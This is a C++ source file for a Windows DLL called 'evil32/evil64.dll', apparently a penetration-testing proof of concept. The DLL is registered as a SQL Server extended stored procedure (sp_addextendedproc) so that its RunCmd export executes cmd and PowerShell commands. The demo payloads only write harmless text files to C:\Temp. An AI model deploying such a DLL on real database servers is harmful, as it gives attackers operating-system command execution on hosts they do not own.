// Reference: http://stackoverflow.com/questions/12749210/how-to-create-a-simple-dll-for-a-custom-sql-server-extended-stored-procedure
// compile for 32 and 64 
// manual tests
// rundll32 evil32.dll,RunCmd
// rundll32 evil64.dll,RunCmd
// sp_addextendedproc 'RunCmd', 'c:\Temp\evil64.dll';
// RunCmd
// DllMain.cpp

#include "stdafx.h"			//dllmain.cpp : Defines the entry point for the DLL application.
#include "srv.h"			//Must get from C:\Program Files (x86)\Microsoft SQL Server\80\Tools\DevTools\Include            
#include "shellapi.h"		//needed for ShellExecute          
#include "string"			//needed for std:string          

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved){

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

#define DLL_FUNC extern "C" __declspec (dllexport)     

DLL_FUNC int __stdcall RunCmd(const char * MyCmd) {

	// Run OS command
	system("echo hello > c:\\Temp\\stuff.txt");
	ShellExecute(NULL, TEXT("open"), TEXT("cmd"), TEXT(" /C echo hello > c:\\Temp\\evil1_cmd.txt"), TEXT(" C:\\ "), SW_SHOW);

	// Run PowerShell command
	system("echo hello > c:\\Temp\\stuff.txt");
	ShellExecute(NULL, TEXT("open"), TEXT("powershell"), TEXT(" -C \" 'test'|out-file c:\\temp\\evil2_ps.txt \" "), TEXT(" C:\\ "), SW_SHOW);

	return 1;
}

